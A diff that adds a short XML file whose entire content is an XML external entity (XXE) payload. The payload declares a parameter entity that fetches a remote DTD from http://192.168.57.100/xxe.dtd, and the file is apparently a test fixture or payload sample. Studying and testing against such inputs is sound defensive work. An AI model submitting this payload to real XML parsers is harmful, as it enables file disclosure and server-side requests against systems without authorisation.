@@ -1,0 +1,5 @@
+<?xml version="1.0" ?>
+<!DOCTYPE add [
+<!ENTITY % remote SYSTEM "http://192.168.57.100/xxe.dtd">
+%remote;]>
+<add />
